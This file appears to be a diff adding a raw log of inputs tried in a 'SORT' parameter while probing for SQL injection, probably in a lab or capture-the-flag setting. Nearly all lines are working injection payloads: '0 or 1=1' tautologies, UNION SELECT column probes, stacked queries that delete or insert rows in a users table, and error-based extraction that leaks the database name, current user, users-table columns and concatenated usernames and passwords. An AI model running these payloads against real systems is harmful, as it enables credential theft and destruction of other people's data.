@@ -1,0 +1,137 @@
+SORT:1
+SORT:1
+SORT:2
+SORT:3
+SORT:4
+SORT:1
+SORT:0 or 1=1-- -
+SORT:0; delete from users where username='asd';-- -
+SORT:0 or 1=1-- -
+SORT:0 or 1=1-- -
+SORT:0
+SORT:1
+SORT:(select 1,2,3)-- -
+SORT:2
+SORT:1 union select 1,2,3-- -
+SORT:3; union select 1,2,3-- -
+SORT:3
+SORT:2
+SORT:2 desc
+SORT:2 desc asc
+SORT:2 asc
+SORT:2 desc
+SORT:1
+SORT:1 desc
+SORT:1 desc union select 1,2,3-- -
+SORT:?sort=(select count(column_name) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+SORT:(select count(column_name) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+SORT:1
+SORT:1
+SORT:2
+SORT:1 ; insert into users (username,password) values ('asd','asd');-- -
+SORT:2; insert into users (username,password) values ('asd','asd'); -- -
+SORT:2 union select 1,2,3-- -
+SORT:(select count(column_name) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))-- -
+SORT:rand(true/false)
+SORT:rand(true/false)
+SORT:rand(true/false)
+SORT:rand(true/false)
+SORT:rand(true/false)
+SORT:rand(true/false)
+SORT:rand(1/2)
+SORT:rand(1/2)
+SORT:rand(1/2)
+SORT:rand(1/2)
+SORT:rand(1/2)
+SORT:rand(1/2)
+SORT:rand(1/2)
+SORT:rand(true/false)
+SORT:rand(true/false);
+SORT:rand(true/false)
+SORT:(select 1 from (select count(*),concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x5c,floor(rand()*2))a from information_schema.tables group by a)b)
+SORT:1; select 1,2,3;-- -
+SORT:1
+SORT:1; select 1,2,3;-- -
+SORT:(select 1,2,3);
+SORT:(select 1);
+SORT:select 1,2,3-- -
+SORT:select username
+SORT:(select username from users
+SORT:(select username from users);-- -
+SORT:(select count(column_name) from information_schema.columns where table_name='users';)-- -
+SORT:(select count(column_name) from information_schema.columns where table_name='users';)
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(union select count(column_name) from information_schema.columns where table_name='users')
+SORT:(union select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))
+SORT:1
+SORT:
+SORT:
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select concat(username,password) from users;
+SORT:(select concat(username,password) from users);-- -
+SORT:1
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:(select count(column_name) from information_schema.columns where table_name='users')
+SORT:1
+SORT:2
+SORT:'
+SORT:'
+SORT:'
+SORT:'
+SORT:'
+SORT:';
+SORT:';select 1,2,3-- -
+SORT:0' or 1=1-- -
+SORT:"
+SORT:a
+SORT:1
+SORT:0 or 1=1 -- -
+SORT:0
+SORT:0 or 1=1-- -
+SORT:0; select 1,2,3-- -
+SORT: union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+SORT: union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+SORT:1
+SORT:'
+SORT:0 union select 1,count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))as dump from information_schema.columns group by dump-- -
+SORT:4'
+SORT:4"
+SORT:4
+SORT:4' -- -
+SORT:4
+SORT:3
+SORT:4 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:4'  or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0)))-- -
+SORT:' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:3'
+SORT:3"
+SORT:3 ' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:3 ' or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:3 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:4 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:4 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:4
+SORT:4 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:3 or (select 1,2,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:3 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:3'
+SORT:3"
+SORT:3"-- -
+SORT:3-- -
+SORT:4
+SORT:4 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:0 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:5 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:0 union select 8
+SORT:0 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
+SORT:0 or (select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2))x from (select 1 union select 2 union select 3)t group by x having min(0))-- -
